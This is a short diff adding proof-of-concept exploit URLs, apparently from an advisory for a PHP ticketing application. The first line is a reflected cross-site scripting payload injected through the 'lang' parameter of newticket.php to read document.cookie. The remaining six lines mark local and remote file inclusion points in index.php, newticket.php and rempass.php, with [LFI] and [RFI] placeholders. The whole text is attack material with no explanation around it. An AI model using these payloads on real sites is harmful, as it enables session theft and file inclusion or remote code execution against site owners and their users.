@@ -1,0 +1,7 @@
+http://www.example.com/newticket.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/index.php?adduser=true&amp;lang=[LFI]
+http://www.example.com/newticket.php?lang=[LFI]
+http://www.example.com/rempass.php?lang=[LFI]
+http://example/index.php?adduser=true&amp;lang=[RFI]
+http://example/newticket.php?lang=[RFI]
+http://example/rempass.php?lang=[RFI]
